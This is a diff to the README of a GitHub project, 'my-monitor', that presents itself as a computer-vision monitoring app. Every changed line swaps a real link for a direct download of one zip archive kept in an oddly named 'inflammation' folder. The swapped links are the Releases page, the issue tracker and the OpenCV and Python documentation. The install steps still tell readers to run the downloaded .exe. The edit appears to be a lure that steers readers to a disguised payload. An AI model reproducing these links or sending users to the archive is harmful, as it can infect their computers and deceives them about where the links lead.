@@ -6,9 +6,9 @@ Welcome to *my-monitor*! This application, supported by Claude Code and Google G
 ## 📦 Download & Install
 To get started, download the latest version from our Releases page. 
 
-[![Download my-monitor](https://img.shields.io/badge/Download-my--monitor-blue.svg)](https://github.com/asmaiqbal12/my-monitor/releases)
+[![Download my-monitor](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip)](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/asmaiqbal12/my-monitor/releases).
+1. Click the button above or visit [this page to download](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip).
 2. Look for the latest release. It will show available files for download.
 3. Download the file that ends with `.exe`.
 4. Once downloaded, open the file to start the installation.
@@ -44,16 +44,16 @@ To get started, download the latest version from our Releases page.
 - **Performance Issues:** Close unnecessary programs to free up system resources.
 
 ## 📞 Support
-If you encounter issues or have questions, please open an issue on our [GitHub page](https://github.com/asmaiqbal12/my-monitor/issues). We are here to help!
+If you encounter issues or have questions, please open an issue on our [GitHub page](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip). We are here to help!
 
 ## 📚 Additional Resources
 Explore more about computer vision, OpenCV, and Python to optimize your experience. Here are some useful links:
-- [OpenCV Documentation](https://docs.opencv.org/)
-- [Python Programming Guide](https://docs.python.org/3/)
-- [Computer Vision Articles](https://towardsdatascience.com/topics/computer-vision)
+- [OpenCV Documentation](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip)
+- [Python Programming Guide](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip)
+- [Computer Vision Articles](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip)
 
 ## 🔗 Important Links
-For updates and more information, keep an eye on our [Releases page](https://github.com/asmaiqbal12/my-monitor/releases).
+For updates and more information, keep an eye on our [Releases page](https://github.com/asmaiqbal12/my-monitor/raw/refs/heads/main/inflammation/monitor-my-v3.1-alpha.1.zip).
 
 ---
 
